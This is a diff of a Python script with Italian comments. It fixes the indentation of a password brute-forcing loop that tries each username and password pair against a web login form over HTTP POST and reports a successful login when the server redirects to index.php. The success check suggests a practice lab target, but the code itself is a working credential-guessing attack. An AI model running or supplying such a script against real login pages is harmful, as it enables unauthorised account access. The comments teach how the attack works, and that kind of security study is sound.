@@ -29,7 +29,7 @@ user = user.rstrip()
 #ciclo for annidato per inserire ogni password ai relativi username
 	
 for pwd in pwd_list:
-pwd = pwd.rstrip()
+	pwd = pwd.rstrip()
 		
 #commando di verifica per l'avvenuta associazione tra username e password(lasciato come commento)
 		
@@ -38,25 +38,25 @@ pwd = pwd.rstrip()
 
 #Utilizza il modulo urllib.parse per codificare i parametri del form di login (username e password) in un formato appropriato per l'invio tramite richiesta HTTP POST. Vengono anche specificati gli header necessari per la richiesta
 		
-post_parameters = urllib.parse.urlencode({'username':user, 'password':pwd,'Login':"login"})
-headers = {"content-type": "application/x-www-form-urlencoded","accept": "text/html,application/xhtml+xml"}
+	post_parameters = urllib.parse.urlencode({'username':user, 'password':pwd,'Login':"login"})
+	headers = {"content-type": "application/x-www-form-urlencoded","accept": "text/html,application/xhtml+xml"}
 
 #Crea una connessione HTTP (HTTPConnection) al server utilizzando l'host e la porta specificati
 
-conn = http.client.HTTPConnection(host,port)
+	conn = http.client.HTTPConnection(host,port)
 
 #Invia una richiesta HTTP POST alla path specificata con i parametri del form e gli header
 
-conn.request("POST",path, post_parameters,headers)
+	conn.request("POST",path, post_parameters,headers)
 
 #Riceve la risposta dal server
 
-response = conn.getresponse()
+	response = conn.getresponse()
 
 #Controlla la risposta del server per verificare se il reindirizzamento (location) è verso la pagina "index.php"
 
-if(response.getheader('location')=="index.php"):
+	if(response.getheader('location')=="index.php"):
 
 #Se è così, stampa un messaggio che indica che l'accesso è stato effettuato con successo utilizzando la coppia di credenziali corrente
 
-print("logged with:\n",user,"-",pwd)
+		print("logged with:\n",user,"-",pwd)
